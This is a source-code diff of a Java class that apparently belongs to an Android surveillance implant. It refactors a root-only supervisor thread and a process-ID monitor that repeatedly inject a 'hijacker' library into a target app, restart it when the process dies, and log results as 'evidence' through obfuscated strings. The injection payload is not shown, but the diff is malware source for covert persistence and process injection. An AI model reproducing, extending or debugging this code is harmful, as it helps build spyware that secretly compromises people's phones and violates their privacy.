@@ -29,15 +29,15 @@ public class Instrument implements Runnable{
 	private String lib_dest, hijacker, path, dumpPath, dexFile, libInAsset;
 	private static String storage = "";
 	private Semaphore sync_semaphore =null;
-	private Thread monitor;
+	private Thread pidMonitorThread;
 	private int killed = 0;
 	private int istrumentation_failures = 0;
 	private int restartedCounter = 0;
 	private boolean started = false;
 	private String instrumentationSuccessDir = null;
-	private boolean watcherContinue = false;
+	private boolean instSupervisorContinue = false;
 	private boolean threadRunning = false;
-	private Thread thread = null;
+	private Thread instSupervisor = null;
 	private ArrayList<String> argList = new ArrayList<String>();
 	private int timeout = 180;
 
@@ -374,7 +374,6 @@ public class Instrument implements Runnable{
 		if(pid_start != pid_stop){
 			started = false;
 		}
-		monitor = null;
 	}
 
 	private int getProcessPid(String process,String proc_owner) {
@@ -404,7 +403,7 @@ public class Instrument implements Runnable{
 		}
 	}
 
-	public void checkProcessMonitor(boolean initialize) {
+	public void  checkProcessMonitor(boolean initialize) {
 		int newpid = 0;
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(checkProcessMonitor): initialize " + initialize);
@@ -418,20 +417,26 @@ public class Instrument implements Runnable{
 				Check.log(TAG + "(checkProcessMonitor): Starting "+proc+ " Monitor thread");
 			}
 			pidMonitor = new PidMonitor(newpid);
-			monitor = new Thread(pidMonitor);
-			monitor.start();
+			pidMonitorThread = new Thread(pidMonitor);
+			if (Cfg.DEBUG) {
+				pidMonitorThread.setName("pidMonitorThread");
+			}
+			pidMonitorThread.start();
 		} else {
 			if( initialize) {
 				pidMonitor.setPid(newpid);
 			}else{
-				if( monitor ==null && monitor.getState() == Thread.State.TERMINATED ){
+				if( pidMonitorThread != null && pidMonitorThread.getState() == Thread.State.TERMINATED ){
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(checkProcessMonitor): pid not null but thread terminated ! set is to null");
+						Check.log(TAG + "(checkProcessMonitor): pidMonitorThread thread terminated ! restart a new one");
 					}
 					pidMonitor.setStopMonitor(false);
 					pidMonitor.setPid(newpid);
-					monitor = new Thread(pidMonitor);
-					monitor.start();
+					pidMonitorThread = new Thread(pidMonitor);
+					if (Cfg.DEBUG) {
+						pidMonitorThread.setName("pidMonitorThread");
+					}
+					pidMonitorThread.start();
 				}
 			}
 
@@ -463,28 +468,28 @@ public class Instrument implements Runnable{
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (stop): starting"); //$NON-NLS-1$
 		}
-		if( Status.haveRoot() && this.thread != null) {
-			watcherContinue = false;
+		if( Status.haveRoot() && this.instSupervisor != null) {
+			instSupervisorContinue = false;
 			Date start = new Date();
 			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 			while (diff_sec < 60) {
 				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
 				try {
-					this.thread.join(500);
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (stop): join return ts="+ this.thread.getState()); //$NON-NLS-1$
+					if (isStarted()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
+						}
+						stopInstrumentation();
 					}
-					if(this.thread.getState() == Thread.State.TERMINATED) {
+					this.instSupervisor.join(500);
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (stop): join return ts="+ this.instSupervisor.getState()); //$NON-NLS-1$
+					}
+					if(this.instSupervisor.getState() == Thread.State.TERMINATED) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (stop): joined "); //$NON-NLS-1$
 						}
-						this.thread = null;
-							if (isStarted()) {
-								if (Cfg.DEBUG) {
-									Check.log(TAG + " (stop): something wrong instrumentation still active, stop it"); //$NON-NLS-1$
-								}
-								stopInstrumentation();
-							}
+						this.instSupervisor = null;
 						break;
 					}
 				} catch (Exception e) {
@@ -498,12 +503,12 @@ public class Instrument implements Runnable{
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
 				}
-				EvidenceBuilder.info(M.e("OOB failed to stop"));
+				EvidenceBuilder.info(M.e("Instrument "+ proc +" failed to stop"));
 			}else{
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
 				}
-				EvidenceBuilder.info(M.e("OOB correctly stopped"));
+				EvidenceBuilder.info(M.e("Instrument "+ proc + " correctly stopped"));
 
 			}
 		}
@@ -511,7 +516,7 @@ public class Instrument implements Runnable{
 	@Override
 	public void run() {
 		setThreadRunning(true);
-		while(watcherContinue ) {
+		while(instSupervisorContinue) {
 			if (Status.haveRoot()) {
 				if (! isStarted()) {
 					startInjection();
@@ -519,10 +524,10 @@ public class Instrument implements Runnable{
 					checkProcessMonitor(false);
 				}
 			}
-			if(!trialsBelowLimits()){
+			if(!trialsBelowLimits() && isStarted()){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(run): too many kill stopping..");
-					watcherContinue = false ;
+					instSupervisorContinue = false ;
 				}
 			}
 			Utils.sleep(5000);
@@ -550,14 +555,17 @@ public class Instrument implements Runnable{
 				Check.log(TAG + "(start): thread ALREADY running");
 			}
 		} else {
-			watcherContinue = true;
-			if (thread == null) {
-				thread = new Thread(this);
+			instSupervisorContinue = true;
+			if (instSupervisor == null) {
+				instSupervisor = new Thread(this);
+				if (Cfg.DEBUG) {
+					instSupervisor.setName("Instrument supervisor");
+				}
 			}
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(start): starting thread");
 			}
-			thread.start();
+			instSupervisor.start();
 		}
 	}
 
@@ -570,27 +578,26 @@ public class Instrument implements Runnable{
 			stopInstrumentation();
 			if (isStarted()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker already running");
+					Check.log(TAG + "(startInjection): hijacker already running");
 				}
 				return true;
 			}
 			if (startInstrumentation()) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker successfully installed");
+					Check.log(TAG + "(startInjection): hijacker successfully installed");
 				}
-				EvidenceBuilder.info(M.e("OOB ready"));
+
 				return true;
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(actualStart): hijacker cannot be installed");
+					Check.log(TAG + "(startInjection): hijacker cannot be installed");
 				}
-				//EvidenceBuilder.info(M.e("OOB cannot be installed"));
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(actualStart): hijacker cannot be installed too many trials");
+				Check.log(TAG + "(startInjection): hijacker cannot be installed too many trials");
 			}
-			EvidenceBuilder.info(M.e("OOB cannot be installed,too many trials"));
+			EvidenceBuilder.info(M.e("ingection " + proc +" cannot be installed,too many trials"));
 		}
 		return false;
 	}
@@ -632,10 +639,12 @@ public class Instrument implements Runnable{
 
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + "(PidMonitor "+proc+" run): closing monitor thread");
+						Check.log(TAG + "(PidMonitor "+proc+" run): closing pidMonitorThread thread");
 					}
 
 					stopMonitor = false;
+					pidMonitorThread = null;
+					pidMonitor = null;
 					return;
 				}
 
